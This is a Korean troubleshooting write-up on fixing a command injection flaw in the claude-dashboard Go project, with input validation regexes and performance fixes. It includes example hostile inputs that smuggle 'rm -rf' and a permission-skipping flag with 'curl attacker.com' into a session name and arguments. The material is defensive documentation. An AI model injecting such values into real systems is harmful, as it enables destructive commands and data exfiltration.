# claude-dashboard 커맨드 인젝션 취약점 트러블슈팅

> 날짜: 2026-03-01
> 프로젝트: [claude-dashboard](https://github.com/seunggabi/claude-dashboard)
> 관련 버전: v0.x (PR #47 수정)

---

## 증상

특수문자가 포함된 tmux 세션 이름이나 Claude 실행 인수를 입력했을 때 의도하지 않은 쉘 명령이 실행될 수 있는 커맨드 인젝션 취약점이 존재했음.

예:
```
세션 이름: my-session; rm -rf /tmp/test
claudeArgs:  --dangerouslySkipPermissions & curl attacker.com
```

---

## 원인: 사용자 입력값을 쉘 명령에 직접 삽입

### 문제

tmux 세션 이름과 Claude 실행 인수를 입력받아 그대로 `exec.Command` 또는 `os/exec` 계열 함수에 전달했음.

```go
// BEFORE: 입력값 검증 없이 직접 사용
cmd := exec.Command("tmux", "new-session", "-s", sessionName)
```

```go
// BEFORE: claudeArgs도 검증 없이 그대로 전달
args := append([]string{"claude"}, strings.Fields(claudeArgs)...)
cmd := exec.Command(args[0], args[1:]...)
```

공격자가 세션 이름이나 인수에 `;`, `$`, `` ` ``, `|`, `&` 등 쉘 메타문자를 삽입하면 임의 명령 실행 가능.

---

## 수정

### 세션 이름 allowlist 검증

```go
// AFTER: 영숫자, 하이픈, 언더스코어만 허용
var sessionNameRegex = regexp.MustCompile(`^[a-zA-Z0-9_-]+$`)

func validateSessionName(name string) error {
    if !sessionNameRegex.MatchString(name) {
        return fmt.Errorf("invalid session name: only alphanumeric, hyphen, underscore allowed")
    }
    return nil
}
```

### claudeArgs 쉘 메타문자 차단

```go
// AFTER: 위험한 메타문자 포함 시 거부
var shellMetaRegex = regexp.MustCompile(`[;&|$` + "`" + `\\]`)

func validateClaudeArgs(args string) error {
    if shellMetaRegex.MatchString(args) {
        return fmt.Errorf("invalid claude args: shell metacharacters are not allowed")
    }
    return nil
}
```

---

## 함께 수정된 성능 문제

코드 리뷰 중 발견된 HIGH 우선순위 성능 이슈도 동시에 수정됨.

### N+1 프로세스 테이블 조회 → O(1) 캐싱

```go
// BEFORE: 세션마다 전체 프로세스 테이블 재조회 (N+1)
for _, session := range sessions {
    pid := findPID(session.Name)  // 매번 ps 실행
}

// AFTER: 한 번만 조회 후 캐시 사용
processCache := buildProcessCache()  // 1회 실행
for _, session := range sessions {
    pid := processCache[session.Name]  // O(1) 조회
}
```

### context.Context + 5초 타임아웃

```go
// AFTER: 타임아웃 적용
ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
defer cancel()
cmd := exec.CommandContext(ctx, "tmux", ...)
```

---

## 영향

| 항목 | 수정 전 | 수정 후 |
|------|--------|--------|
| 보안 취약점 | CRITICAL 2개 | 0개 ✅ |
| 리프레시 성능 | baseline | **4x 향상** ⚡ |
| 테스트 커버리지 | 0% | **34.3%** (162개 테스트) |

---

## 관련 PR

| PR | 내용 |
|----|------|
| #47 | 커맨드 인젝션 수정, 성능 개선, 테스트 162개 추가 |
